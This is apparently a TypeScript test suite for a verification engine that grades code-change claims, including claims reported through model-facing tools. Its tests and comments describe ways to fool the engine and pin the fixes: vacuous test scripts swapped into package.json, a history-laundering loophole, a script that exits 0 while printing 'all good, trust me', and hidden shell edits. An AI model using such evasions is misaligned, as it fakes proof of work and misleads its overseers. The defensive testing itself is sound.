  // Simulate a baseline an OLDER engine wrote: strip the attachment, then
  // re-record the stripped file's digest the way that engine's saveBaseline
  // would have (the naive hand-strip is now a loud H-23 tamper event, pinned
  // in its own test above).
  const raw = await fs.readFile(`${ROOT}/.proof/baseline.json`)
  assert.ok(raw !== undefined)
  const parsed = JSON.parse(raw) as { scriptDigests?: unknown }
  assert.ok(parsed.scriptDigests !== undefined, 'sanity: the fresh baseline does carry the digests')
  delete parsed.scriptDigests
  const stripped = JSON.stringify(parsed, null, 2)
  await fs.writeFile(`${ROOT}/.proof/baseline.json`, stripped)
  await engine.storeView.mark('baseline/saved', { digest: sha256(stripped), bytes: stripped.length })
  // v0.24 (Y-H-09) fixture fidelity: the old engine's saveBaseline ALWAYS
  // checkpointed right after its marker (see the pre-ζ twin above).
  await engine.storeView.checkpoint()
  assert.equal((await engine.audit()).chain.baselineTampered, false,
    'the simulated old-version baseline is internally consistent')

  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
  const runsInA = (): number => commands.calls.filter(c => c.cwd === `${ROOT}/packages/a`).length
  const before = runsInA()
  const outcome = await engine.verify({ changed: ['packages/b/src/b.ts'] })

  assert.equal(outcome.scriptDrift, undefined, 'nothing recorded to compare against — drift is honestly undetectable')
  assert.equal(runsInA(), before, 'the drifted check rests on its stale evidence, exactly as pre-H5')
  assert.ok(!fs.log.some(l => l.includes('"scriptDrift"')), 'no drift marker may exist')
  // The hole a new baseline closes: this grade is the documented reason to
  // re-anchor. (Asserted, not hidden — the upgrade path is a fresh baseline.)
  assert.equal(outcome.report.grade, 'proven', 'the honest statement of the downgrade: pre-H5 baselines cannot see this')
  assert.equal(outcome.baselineTampered, undefined, 'an honest old baseline is not a tamper event')
})

test('H3 (default target): one drifted pass never certifies — the new body re-earns, pass by pass', async () => {
  // The exact scenario the old pricing failed: default certifyTarget 0.97,
  // a monorepo with green history, and `"test": "node -e \"\""` swapped into
  // package a. At v0.21 the old body's learned prior (≈0.836 after the
  // baseline run) survived the drift "discount", and ONE vacuous pass
  // certified. H-03 prices a drifted body cold with the unreviewed-body β:
  // the first pass posterior is ≈0.941 — stale. v0.24 (V3-M1) removes the
  // pass-by-pass re-earning path entirely: the boundary is the LAST drift
  // sighting, so every verify re-cuts its own generation and the only
  // recovery is a fresh baseline.
  const fs = MemoryFs.of(driftProject())
  const commands = new FakeCommands()
  const engine = driftEngine(fs, commands, { certifyTarget: undefined })
  assert.ok((engine as unknown as { options: { certifyTarget: number } }).options.certifyTarget === 0.97,
    'sanity: the fixture runs at the production target')

  await engine.establishBaseline()
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))

  // Pass #1 (the detection run): detected, re-run, priced cold — NOT proven.
  const first = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.ok(first.scriptDrift !== undefined && first.scriptDrift.length === 1)
  assert.equal(first.report.grade, 'stale', 'a single pass under a body nobody vouched for is not certification')
  assert.ok(first.report.confidence !== undefined && first.report.confidence < 0.97,
    `first drifted pass confidence ${first.report.confidence} must sit under the 0.97 target`)
  assert.ok(first.report.confidence !== undefined && first.report.confidence >= 0.9,
    'and it is a priced number, not a failure')

  // Pass #2 immediately after: still short — and v0.24 (V3-M1) it stays
  // short FOREVER on passes alone: every verify while the body stays
  // un-re-anchored writes a fresh drift marker, and the LAST sighting is the
  // boundary — each verify's records precede their own marker, so the next
  // verify admits nothing. The v0.21 "re-earn pass by pass" story was the
  // loophole: drift to a vacuous body, accumulate its green history across
  // N verifies, then swap in the target body — the first-seen boundary let
  // the new body inherit every pass the previous one earned. Last-seen
  // makes each marker a fresh generational cut: the ONLY recovery for a
  // drifted body is the documented one — re-anchor.
  const second = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(second.report.grade, 'stale', 'a second pass has not re-earned certification')
  for (let i = 3; i <= 12; i += 1) {
    const run = await engine.verify({ changed: ['packages/b/src/b.ts'] })
    assert.equal(run.report.grade, 'stale',
      `pass #${i} stays stale — a drift marker re-cuts the boundary on every verify, so no green history accumulates for a body the baseline never vouched`)
  }

  // And the honest shortcut — now the only shortcut: a fresh baseline
  // re-anchors the new body's digest, drift ends, and the very next verify
  // is an ordinary organic run.
  const newBody = driftEngine(fs, new FakeCommands(), { certifyTarget: undefined })
  await newBody.establishBaseline()
  const afterReanchor = await newBody.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(afterReanchor.scriptDrift, undefined, 'the re-anchored baseline locks the new body')
  assert.equal(afterReanchor.report.grade, 'proven', 'an anchored body is priced by ordinary history again')
})

test('H5: verifyContract carries the drift verdict on its machine path — obligations eat the re-run evidence', async () => {
  const fs = MemoryFs.of(driftProject())
  const commands = new FakeCommands()
  const engine = driftEngine(fs, commands)
  await engine.establishBaseline()
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
  const aCheck = (await engine.loadChecks(true)).find(c => c.cwd === 'packages/a')

  const outcome = await engine.verifyContract({
    changed: ['packages/b/src/b.ts'],
    contract: { kind: 'behavior-adding', claim: 'extended package b' },
  })
  assert.ok(outcome.scriptDrift !== undefined && outcome.scriptDrift.length === 1)
  assert.equal(outcome.scriptDrift?.[0], aCheck?.id)
  // The drifted check re-ran under the contract too, and its fresh (vacuously
  // green) evidence is exactly what the obligations were judged against.
  assert.ok(outcome.checks.some(c => c.checkId === aCheck?.id && c.current !== undefined),
    'the drifted check produced current evidence for the contract')
  assert.ok(fs.log.some(l => l.includes('proof/verified') && l.includes('"scriptDrift"')),
    'the contract boundary marker records the drift')
})

// -- H6: git-blind snapshots — a failed query is not "clean" -------------------

/** A workspace whose dirty query fails while a flag is set (index.lock, …). */
class FlakyDirtyWorkspace extends FakeWorkspace {
  broken = true
  async gitDirty(): Promise<string[]> {
    if (this.broken) throw new Error('fatal: Unable to create .git/index.lock: File exists')
    return super.gitDirty()
  }
}

test('H6: a baseline built on a failed dirty query is degraded — visibly, and past recovery', async () => {
  const fs = MemoryFs.of(project())
  const ws = new FlakyDirtyWorkspace(ROOT)
  const engine = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: ws, clock: new FakeClock(), impactGraphLimit: 1_000,
  })
  const { baseline } = await engine.establishBaseline()
  assert.equal(baseline.checks.length, 2, 'the anchor itself is fine — the blindness rides beside it')
  assert.equal((baseline as { snapshotDegraded?: true }).snapshotDegraded, true,
    'the failed dirty query is recorded next to the baseline, not silently as "clean"')
  assert.equal(baseline.workspace.dirty.length, 0, 'the snapshot shape is untouched (nothing entered its hash material)')
  assert.ok(fs.log.some(l => l.includes('baseline/established') && l.includes('"snapshotDegraded":true')),
    'the chain marker carries the fact')

  // The query recovers; the blindness does not age out. Every verify against
  // this blind anchor is forced full until a fresh baseline re-anchors — even
  // with git perfectly healthy now (this is the leg B1's resolution-level
  // degradation cannot see: the failure happened at BASELINE time).
  ws.broken = false
  fs.mutate(`${ROOT}/src/a.ts`, 'export const a = 2\n')
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.degraded, true, 'a blind anchor degrades the run even with git healthy now')
  assert.equal(outcome.selection.forcedAll, true)
  assert.equal(outcome.selection.affected.length, 2, 'the full check set ran')
  assert.equal(outcome.report.grade, 'proven', 'the forced run itself still grades normally (E3 semantics)')
})

test('H6: git available but HEAD gone — changedSince is wholly blind, the run is forced', async () => {
  const fs = MemoryFs.of(project())
  const ws = new FakeWorkspace(ROOT)
  const engine = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: ws, clock: new FakeClock(), impactGraphLimit: 1_000,
  })
  await engine.establishBaseline()
  // Unborn/detached repo: no ref to diff against, so every committed change
  // since the baseline commit is invisible to changedSince.
  ws.head = null
  fs.mutate(`${ROOT}/src/a.ts`, 'export const a = 2\n')
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.degraded, true, 'a lost HEAD with git claimed available is blindness')
  assert.equal(outcome.selection.forcedAll, true)
  assert.equal(outcome.selection.precision, 'forced')
})

// -- H9b: shell-blind provenance — absence from touched is not proof of external --

test('H9b: a shell this session demotes untouched changes from external to unknown', async () => {
  const run = async (shellUsedSince: boolean | undefined) => {
    const fs = MemoryFs.of(project())
    const ws = new FakeWorkspace(ROOT)
    const engine = new ProofEngine({
      root: ROOT, fs, commands: new FakeCommands(), workspace: ws, clock: new FakeClock(), impactGraphLimit: 1_000,
    })
    await engine.establishBaseline()
    // A file moves outside the (declared) touched set — the shape a shell's
    // invisible edits produce: nothing in the tool stream names it.
    fs.mutate(`${ROOT}/src/ghost.ts`, 'export const ghost = 1\n')
    ws.dirty = ['src/ghost.ts']
    return engine.verify({ touched: ['src/a.ts'], ...(shellUsedSince !== undefined ? { shellUsedSince } : {}) })
  }

  const blind = await run(true)
  const record = blind.attribution.records.find(r => r.path === 'src/ghost.ts')
  assert.ok(record, 'the ghosted file moved')
  assert.equal(record?.provenance, 'unknown',
    'a shell ran — absence from the touched set is absence of evidence, not proof of external')
  assert.ok(blind.report.checks.every(c => !(c.externalSuspects ?? []).includes('src/ghost.ts')),
    'no check charges the file as an external suspect')

  // The control: the same shape without a shell stays honestly external.
  const control = await run(false)
  assert.equal(control.attribution.records.find(r => r.path === 'src/ghost.ts')?.provenance, 'external')
})

test('H9b: the model-facing tools carry the session shell fact into the engine', async () => {
  // The plugin entry wires `() => watch.sessionShellUsed()` the same route as
  // `touched`; this exercises the tools seam itself — the value the tool
  // reports must move with the session fact, not with the call site.
  const fs = MemoryFs.of(project())
  const ws = new FakeWorkspace(ROOT)
  const engine = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: ws, clock: new FakeClock(), impactGraphLimit: 1_000,
  })
  await engine.establishBaseline()
  fs.mutate(`${ROOT}/src/ghost.ts`, 'export const ghost = 1\n')
  ws.dirty = ['src/ghost.ts']
  let shellUsed = true
  const verify = createProofTools(engine, () => ['src/a.ts'], undefined, () => shellUsed)
    .find(t => t.name === 'proof_verify')
  assert.ok(verify !== undefined)
  const execution = {
    callId: 'call-1', rootCallId: 'call-1', name: 'proof_verify', arguments: {},
    token: Symbol('token'), signal: new AbortController().signal,
    deferContext: () => undefined, concludeTurn: () => undefined,
  }
  const run = async (): Promise<string[]> => {
    const value = await verify!.execute({}, execution as Parameters<typeof verify.execute>[1]) as unknown as {
      externalChanged?: string[]
    }
    return value.externalChanged ?? []
  }
  assert.deepEqual(await run(), [], 'with a shell in the session, the ghosted file is not reported external')
  shellUsed = false
  assert.deepEqual(await run(), ['src/ghost.ts'], 'without one, the same file is honestly external')
})

// -- B2 follow-up: the adapter evidence-store guard is separator-blind ----------

test('adapters/shared/paths: the evidence-store guard folds a backslashed evidenceDir segment', () => {
  // deriveProofPaths POSIX-folds the configured segment on its own
  // (`'.\proof'` ≡ `./proof` ≡ the 'proof' directory, never '.proof'); this
  // pins the guard itself, so a hand-assembled ProofPaths still carrying a
  // backslashed segment cannot silently match nothing (an under-deny — the
  // `'.\proof'` shape index.ts closed in H10). test/24 owns the derive-side
  // matrix and is not this batch's to edit; the backslash case lives here.
  const paths = deriveProofPaths({ root: ROOT, trustRoot: '/trust', evidenceStore: 'workspace', evidenceDir: '.\\proof' })
  assert.equal(paths.evidenceDir, 'proof', 'deriveProofPaths folds the configured segment')
  assert.equal(touchesEvidencePath('proof/evidence.jsonl', paths), true, 'the derived guard hits the store it derived')
  const handBuilt: typeof paths = { ...paths, evidenceDir: '.\\proof' }
  assert.equal(touchesEvidencePath('proof/evidence.jsonl', handBuilt), true,
    'the guard is separator-blind on the store segment even without deriveProofPaths')
})

test('H5②: a deleted check definition surfaces as vanished — the report cannot shrink back to green', async () => {
  // The other half of definition reconciliation: deleting a check's
  // definition used to make it vanish from specs entirely — never attributed,
  // never unverified, never blocking `proven`. The baseline's anchored ids
  // are now reconciled against discovery; a hole in the pool reads as a hole.
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  assert.equal((await engine.baseline())?.checks.length, 2, 'two checks at baseline time')

  fs.mutate(`${ROOT}/package.json`, JSON.stringify({
    name: 'demo',
    scripts: { build: 'tsc -b' }, // the test script's definition is gone
  }))
  const outcome = await engine.verify({ changed: ['package.json'] })
  assert.equal(outcome.vanished?.length, 1, 'the anchored test check vanished from discovery')
  assert.equal(outcome.report.vanished?.length, 1, 'the report carries the hole')
  assert.equal(outcome.report.grade, 'stale', 'a vanished definition blocks proven')
  assert.ok((outcome.report.vanished?.[0] ?? "").startsWith("package.json:"), "identified by source id")
})

// -- M10: llm-jury never punishes a human endorsement ---------------------------

test('M10: llm-jury — an endorsement leaves the fused product untouched; a rejection still collapses it', async () => {
  const claim = 'b internals refactored; the jury and a human both reviewed it'
  const setup = async (): Promise<{ fs: MemoryFs; engine: ProofEngine }> => {
    const fs = MemoryFs.of(surfaceProject())
    const engine = contractEngine(fs, new FakeCommands())
    await engine.establishBaseline()
    return { fs, engine }
  }
  const verify = (engine: ProofEngine) => engine.verifyContract({
    changed: ['src/b.ts'],
    contract: { kind: 'llm-jury', claim },
  })

  // Control: the B uphold alone — 0.99^0.7 ≈ 0.993 clears the 0.97 target.
  const control = await setup()
  await seedJuryAttestation(control.engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
  const alone = await verify(control.engine)
  assert.equal(alone.report.grade, 'proven')
  assert.ok(alone.report.confidence !== undefined)
  assert.ok(Math.abs(alone.report.confidence - 0.99 ** 0.7) < 1e-12)

  // B uphold + human endorse. The product used to multiply in the human's
  // 0.95^0.9 ≈ 0.955 factor and DEMOTE this exact claim to stale — backing
  // it made it worse, the inversion of what a Class C witness is for. The
  // endorsement is risk acceptance (the machine path's fuseConfidence keeps
  // the number untouched for the same reason), so the product must not move.
  const endorsed = await setup()
  await seedJuryAttestation(endorsed.engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
  await seedHumanAttestation(endorsed.engine, claim, { gen: 0, decision: 'endorse' })
  const withEndorse = await verify(endorsed.engine)
  assert.equal(withEndorse.report.grade, 'proven', 'an endorsement must never demote an llm-jury claim')
  assert.ok(withEndorse.report.confidence !== undefined)
  assert.ok(Math.abs(withEndorse.report.confidence - (alone.report.confidence ?? 0)) < 1e-12,
    `endorse leaves the product untouched (got ${withEndorse.report.confidence}, B alone ${alone.report.confidence})`)
  // Both witnesses stay visible in the summary — the grade rode on both.
  assert.deepEqual(withEndorse.contract.attestations?.map(a => a.class).sort(), ['B', 'C'])

  // B uphold + human reject: the veto keeps its full weight — the product
  // collapses to 0.99^0.7 · 0.05^0.9 and the claim is stale.
  const rejected = await setup()
  await seedJuryAttestation(rejected.engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
  await seedHumanAttestation(rejected.engine, claim, { gen: 0, decision: 'reject' })
  const withReject = await verify(rejected.engine)
  assert.equal(withReject.report.grade, 'stale', 'a human rejection still vetoes an llm-jury claim')
  assert.ok(Math.abs((withReject.report.confidence ?? 0) - (0.99 ** 0.7) * (0.05 ** 0.9)) < 1e-12,
    `reject keeps its product weight (got ${withReject.report.confidence})`)
})

// -- M12: the scaffold's protocol line is judged, not just the exit code --------

test('M12: conjureRun — exit 0 without a SYNTHETIC: PASS line is an error, not a pass', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  const claim = 'the silent script'
  const { request } = await engine.conjureRequest({ claim, paths: ['src/a.ts'] })
  // Screens clean, exits 0, prints everything EXCEPT the protocol line — the
  // empty-script hole: the exit code alone proved nothing, and the protocol
  // used to be judged by nobody.
  fs.mutate(`${ROOT}/.proof-synthetic/${request.entry}`, 'const one = 1\n')
  commands.on(() => true, { exitCode: 0, output: 'all good, trust me' })

  const run = await engine.conjureRun({ claim, entry: request.entry })
  assert.equal(run.status, 'error', 'no protocol line: the exit code does not get to say PASS')
  assert.match(run.outputHead, /^protocol line missing: scaffolded scripts must end with SYNTHETIC: PASS\/FAIL/)
  assert.match(run.outputHead, /all good, trust me/, 'the original output rides below the note')

  // The evidence and the run marker record the honest verdict, and the
  // re-addressed record still addresses itself.
  const evidence = (await engine.latestEvidence()).get(run.checkId)
  assert.ok(evidence, 'the breached run is still evidence — recorded, not discarded')
  assert.equal(evidence.status, 'error')
  assert.match(evidence.outputHead ?? '', /^protocol line missing/)
  assert.ok(evidence.synthetic !== undefined, 'the synthetic metadata still self-certifies the script')
  assert.ok(fs.log.some(l => l.includes('"synthetic/run"') && l.includes('"status":"error"')),
    'the run marker carries the breach')
  assert.equal((await engine.audit()).ok, true)

  // Control: the same exit 0 WITH the line is a pass — the screen and the
  // scaffold's own contract are untouched.
  const speaking = 'the speaking script'
  const { request: speakingRequest } = await engine.conjureRequest({ claim: speaking, paths: ['src/a.ts'] })
  fs.mutate(`${ROOT}/.proof-synthetic/${speakingRequest.entry}`, "console.log('SYNTHETIC: PASS')\n")
  commands.on(argv => argv.includes(speakingRequest.entry), { exitCode: 0, output: 'SYNTHETIC: PASS' })
  const spoken = await engine.conjureRun({ claim: speaking, entry: speakingRequest.entry })
  assert.equal(spoken.status, 'pass')
})

// -- M18: explicit change sets are canonicalised before they are used -----------

test('M18: backslash and ./ change spellings select and grade like canonical ones', async () => {
  const fs = MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/docs/guide.md`]: '# guide\n',
  })
  const engine = preciseEngine(fs, new FakeCommands(), [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
  ])
  await engine.establishBaseline()

  // Pre-M18 both spellings silently matched nothing: the selection came back
  // empty and the change read "covered by no check" — unproven by spelling.
  const outcome = await engine.verify({ changed: ['src\\a.ts', './src/a.ts'] })
  assert.deepEqual(outcome.changed, ['src/a.ts'], 'the spellings collapse onto one canonical path')
  assert.deepEqual(outcome.selection.affected.map(c => c.label), ['src tests'],
    'the normalised path selects the check the change actually touches')
  assert.equal(outcome.report.grade, 'proven', 'not unproven by spelling alone')

  // Root-anchored spellings fold against the engine's own root (the
  // toWorkspaceRelative discipline).
  const anchored = await engine.verify({ changed: [`${ROOT}/src/a.ts`] })
  assert.deepEqual(anchored.changed, ['src/a.ts'])
  assert.equal(anchored.report.grade, 'proven')
})

test('M18: coverage matching survives host path spellings — a backslash change no longer reads uncovered', async () => {
  const root = join(COVER_ROOT, 'm18-canonical')
  await makeCoverageWorkspace(root, {
    'src/feature.mjs': 'export const feature = (n) => n * 2\n',
    'check.mjs': [
      "import { feature } from './src/feature.mjs'",
      'if (feature(2) !== 4) process.exit(1)',
      "console.log('executed feature')",
      '',
    ].join('\n'),
  })
  try {
    const engine = coverageEngine(root, [
      { label: 'feature tests', command: ['node', 'check.mjs'], kind: 'test', paths: ['src/**'] },
    ])
    await engine.establishBaseline()
    // The executed set is canonical ('/'-separated, from the V8 profile);
    // the change set arrives in host spellings. Matching the two is exactly
    // what canonicalisation is for — pre-M18 this run read uncovered.
    const outcome = await engine.verify({ changed: ['src\\feature.mjs', './src/feature.mjs'] })
    assert.equal(outcome.report.coverage?.basis, 'v8')
    assert.deepEqual(outcome.coverage?.uncovered, [],
      'the canonical executed set matched the normalised change')
    assert.equal(outcome.coverage?.executedCount, 1)
    assert.equal(outcome.report.grade, 'proven', 'observe mode + executed change: no unproven demotion')
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

// -- M19b: the claim / reason parameters land on the boundary markers -----------

test('M19b: verify claim and baseline reason ride their markers, bounded to 200 characters', async () => {
  const long = 'x'.repeat(350)
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline({ reason: `anchoring: ${long}` })
  const anchored = fs.log.find(l => l.includes('"baseline/established"'))
  assert.ok(anchored, 'the established marker is on the chain')
  assert.ok(anchored.includes(`"reason":"anchoring: ${'x'.repeat(189)}"`),
    'the reason is recorded, truncated at 200 characters total')
  assert.ok(!anchored.includes('x'.repeat(190)), 'and not a character longer')

  const outcome = await engine.verify({ changed: ['src/a.ts'], claim: `claim: ${long}` })
  assert.equal(outcome.report.grade, 'proven')
  const verified = [...fs.log].reverse().find(l => l.includes('"proof/verified"'))
  assert.ok(verified, 'the verified marker is on the chain')
  assert.ok(verified.includes(`"claim":"claim: ${'x'.repeat(193)}"`),
    'the claim rides the marker, truncated at 200 characters total')

  // Absent stays absent: no empty fields are minted for unsaid parameters.
  const quietFs = MemoryFs.of(project())
  const quiet = makeEngine(quietFs, new FakeCommands())
  await quiet.establishBaseline()
  await quiet.verify({ changed: ['src/a.ts'] })
  assert.ok(quietFs.log.filter(l => l.includes('"baseline/established"')).every(l => !l.includes('"reason"')),
    'no reason field when none was given')
  assert.ok(quietFs.log.filter(l => l.includes('"proof/verified"')).every(l => !l.includes('"claim"')),
    'no claim field when none was given')
})

// -- M8: the walk's own truncation reaches the graph -----------------------------

test('M8: loadGraph folds the walk\'s truncation into graph.truncated', async () => {
  // limit 2 over project()'s four files: the WALK stops at two (truncated),
  // while the builder's own eligible count (one .ts among the two walked)
  // never exceeds its limit — so graph.truncated is true exactly through the
  // walkTruncated wiring, not through the builder's own cap.
  const engine = new ProofEngine({
    root: ROOT,
    fs: MemoryFs.of(project()),
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    impactGraphLimit: 2,
  })
  const graph = await engine.loadGraph()
  assert.ok(graph !== undefined)
  assert.equal(graph.truncated, true, 'the walk stopped at its limit; the graph must say so')
})

// -- v0.18: transparency-log publishing (publishCheckpoint) ----------------------

import type { SignerPort } from '../src/core/ports.ts'
import {
  loadPtl, ptlLeafHash, verifyConsistency, verifyInclusion, verifyTreeHead,
} from '../src/core/transparency.ts'

/**
 * Deterministic stand-in keys, one per role: the workspace chain key and the
 * transparency-log operator key are DIFFERENT keys on purpose — the STH must
 * speak for the log operator, never borrow the workspace's authority.
 */
class FakeKey implements SignerPort {
  readonly keyId: string
  constructor(keyId: string) { this.keyId = keyId }
  async sign(data: string): Promise<string> { return `sig:${this.keyId}:${sha256(data)}` }
  async verify(data: string, signature: string): Promise<boolean> {
    return signature === `sig:${this.keyId}:${sha256(data)}`
  }
}

const PTL_DIR = `${ROOT}/ptl`

/** The bare signature-check closure T1's verifyTreeHead consumes. */
const operatorCheck = (key: FakeKey) => (data: string, sig: string): Promise<boolean> => key.verify(data, sig)

/** Engine with a signed chain AND a publishable transparency log. */
function publishingEngine(fs: MemoryFs, extra: Record<string, unknown> = {}) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    workspaceKey: 'ws',
    signer: () => Promise.resolve(new FakeKey('ws-key')),
    ptlDir: PTL_DIR,
    ptlSigner: () => Promise.resolve(new FakeKey('operator-key')),
    impactGraphLimit: 1_000,
    ...extra,
  })
}

test('v0.18: publishCheckpoint mirrors the signed checkpoint, signs the tree, and proves inclusion', async () => {
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()

  const first = await engine.publishCheckpoint()
  assert.equal(first.duplicate, false, 'the first publish mints a new leaf')
  assert.equal(first.sequence, 0)
  assert.equal(first.treeSize, 1)
  assert.equal(first.logId, 'operator-key', 'the STH names the operator key that signed it')

  // The outcome describes the tree AS PERSISTED: a fresh load through the
  // same loader a third-party verifier would use recomputes the same root.
  const { log } = await loadPtl(fs, PTL_DIR)
  assert.equal(log.size, 1)
  assert.equal(log.merkleRoot(), first.root, 'sth root is the recomputed Merkle root')
  assert.equal(first.sth.root, first.root)
  assert.equal(first.sth.treeSize, 1)
  assert.equal(first.sth.logId, first.logId)
  assert.equal(first.at, first.sth.at, 'the outcome timestamp is the STH timestamp')

  // The operator signature genuinely covers the tree head (verifyTreeHead
  // takes the bare check function — any key-holding party can adjudicate).
  assert.equal(await verifyTreeHead(first.sth, operatorCheck(new FakeKey('operator-key'))), true)
  assert.equal(await verifyTreeHead(first.sth, operatorCheck(new FakeKey('ws-key'))), false,
    'the workspace key does NOT verify the STH — the operator is a separate authority')

  // The published entry is a faithful mirror of the latest signed checkpoint:
  // same count/head/at/sig/keyId, keyed by the ENGINE's workspace identity.
  const checkpoint = await engine.storeView.latestSignedCheckpoint()
  assert.ok(checkpoint !== undefined)
  const entry = log.entries[0]!
  assert.equal(entry.v, 1)
  assert.equal(entry.workspaceKey, 'ws')
  assert.equal(entry.keyId, checkpoint.keyId)
  assert.equal(entry.count, checkpoint.payload.count)
  assert.equal(entry.head, checkpoint.payload.head)
  assert.equal(entry.at, checkpoint.payload.at)
  assert.equal(entry.sig, checkpoint.sig)
  assert.equal(first.leafHash, ptlLeafHash(entry))

  // Inclusion: the leaf is committed by the root, provably. The verifier
  // takes the ENTRY (it re-derives the leaf hash itself), the proof, and the
  // recomputed root — exactly the third-party position.
  assert.equal(
    verifyInclusion(entry, first.sequence, first.treeSize, first.inclusionProof, first.root),
    true,
  )
})

test('v0.18: republishing the same checkpoint is a duplicate — the tree does not grow', async () => {
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()

  const first = await engine.publishCheckpoint()
  const second = await engine.publishCheckpoint()
  assert.equal(second.duplicate, true, 'nothing new was signed since the first publish')
  assert.equal(second.treeSize, first.treeSize, 'the tree is unchanged')
  assert.equal(second.sequence, first.sequence)
  assert.equal(second.leafHash, first.leafHash)
  assert.equal(second.root, first.root)
  assert.equal((await loadPtl(fs, PTL_DIR)).log.size, 1, 'no second leaf landed on the log')
  assert.equal(await verifyTreeHead(second.sth, operatorCheck(new FakeKey('operator-key'))), true,
    'a duplicate still returns a genuinely signed (re-asserted) tree head')
})

test('v0.18: an unsigned chain has nothing publishable — publishCheckpoint throws clean', async () => {
  const fs = MemoryFs.of(project())
  // No workspace signer: checkpoints land unsigned, and publishing has
  // nothing to mirror. The failure must be a clean precondition error, not a
  // crash or a silently unsigned artifact.
  const engine = new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    ptlDir: PTL_DIR,
    ptlSigner: () => Promise.resolve(new FakeKey('operator-key')),
  })
  await engine.establishBaseline()
  assert.equal((await engine.audit()).chain.mode, 'unsigned')
  await assert.rejects(
    () => engine.publishCheckpoint(),
    /no signed checkpoint on the evidence chain.*baseline.*verification/,
    'the error names the precondition: produce a signed checkpoint first',
  )
})

test('v0.18: publishCheckpoint without ptlDir is a configuration error, checked before anything else', async () => {
  const fs = MemoryFs.of(project())
  // Fully signed chain, fully provisioned operator — but no ptlDir: the
  // feature is OFF, and the refusal must say so before touching any state.
  const engine = publishingEngine(fs, { ptlDir: undefined })
  await engine.establishBaseline()
  await assert.rejects(
    () => engine.publishCheckpoint(),
    /transparency log not configured \(ptlDir\)/,
  )
})

test('v0.18: two checkpoints publish two leaves, and the tree provably extends itself', async () => {
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()
  const publish1 = await engine.publishCheckpoint()

  // New work on the chain: verification appends evidence, a marker, and a
  // NEW signed checkpoint whose count moved past the first one.
  const outcome = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(outcome.report.grade, 'proven')
  const publish2 = await engine.publishCheckpoint()

  assert.equal(publish2.duplicate, false)
  assert.equal(publish2.sequence, 1, 'the second checkpoint lands as the second leaf')
  assert.equal(publish2.treeSize, 2)
  assert.notEqual(publish2.leafHash, publish1.leafHash)

  const { log } = await loadPtl(fs, PTL_DIR)
  assert.equal(log.size, 2)
  assert.ok(log.entries[1]!.count > log.entries[0]!.count,
    'the second mirror carries the later checkpoint count')

  // Consistency: the size-2 tree provably EXTENDS the size-1 tree publish1
  // committed to — the log's history cannot have been rewritten between them.
  assert.equal(
    verifyConsistency(
      publish1.treeSize, publish1.sth.root,
      publish2.treeSize, publish2.sth.root,
      log.consistencyProof(publish1.treeSize, publish2.treeSize),
    ),
    true,
  )
  // And the first leaf is still included in the grown tree.
  assert.equal(
    verifyInclusion(log.entries[0]!, 0, log.size, log.inclusionProof(0), publish2.root),
    true,
  )
})

// -- v0.19: the responsibility DAG (delegation verbs) ---------------------------

const CHILD_LOG = `${ROOT}/child/.proof/evidence.jsonl`
const CHILD_BASE = `${ROOT}/child/.proof/baseline.json`
const CHILD_AT = '2026-10-06T00:00:00.000Z'

/** Workspace snapshot of the child a delegated bundle was minted under. */
function childWs() {
  return snapshotWorkspace('child-head', ['src/child.ts'])
}

/**
 * An honest child bundle: a real `EvidenceStore` chain in memory, SIGNED by
 * the child's host key (H-05: the submission path demands a signed
 * checkpoint — the one thing an empty-log forger cannot self-supply; the
 * FakeKey above has real signature semantics), one decisively passing
 * record, a checkpoint, and a self-addressed baseline — the same recipe
 * 22-bundle's honest fixtures use, at the minimum the format demands. The
 * submission path must accept exactly what the exchange format's own
 * verifier calls clean, nothing looser.
 */
async function honestChildBundle(workspaceKey = 'child-ws'): Promise<ProofBundle> {
  const fs = MemoryFs.of({})
  const store = new EvidenceStore(fs, CHILD_LOG, CHILD_BASE, new FakeClock(), {
    workspaceKey,
    checkpointEvery: 1000,
    signer: async () => new FakeKey('child-key'),
  })
  const record = makeEvidence(
    spec({ id: 'child-test' }),
    { status: 'pass', exitCode: 0, durationMs: 5, output: 'ok\n' },
    childWs(),
    new FakeClock(),
  )
  await store.append(record)
  await store.checkpoint()
  const baseline = buildBaseline([record], childWs(), new FakeClock())
  const log = await fs.readFile(CHILD_LOG)
  assert.ok(typeof log === 'string', 'the child store wrote its log')
